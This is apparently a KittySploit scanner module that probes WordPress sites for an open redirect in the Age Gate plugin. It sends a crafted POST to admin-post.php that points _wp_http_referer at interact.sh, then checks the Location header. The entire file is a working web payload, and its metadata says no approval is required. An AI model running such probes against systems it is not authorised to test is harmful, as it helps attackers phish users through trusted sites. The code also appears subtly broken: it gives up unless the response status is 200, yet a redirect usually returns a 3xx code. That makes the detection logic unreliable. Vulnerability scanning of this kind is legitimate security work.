#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Age Gate plugin before 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Age Gate <2.13.5 - Open Redirect Detection',
        'description': 'WordPress Age Gate plugin before 2.13.5 contains an open redirect vulnerability via the _wp_http_referer parameter after certain actions and after invalid or missing nonces. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'agegate', 'unauth', 'wpscan', 'packetstorm', 'wp-plugin', 'redirect', 'wordpress', 'wp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/10489',
            'https://packetstormsecurity.com/files/160236/',
            'https://wordpress.org/plugins/age-gate',
        ],
    }

    def run(self):
        path = '/wp-admin/admin-post.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&_wp_http_referer=https://interact.sh')
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_regexes = ('(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)(?:[a-zA-Z0-9\\-_\\.@]*)interact\\.sh\\/?(\\/|[^.].*)?$',)
        if any(re.search(rx, headers) for rx in header_regexes):
            self.set_info(
                severity='medium',
                reason='WordPress Age Gate <2.13.5 - Open Redirect detected',
                path=path,
            )
            return True
        return False

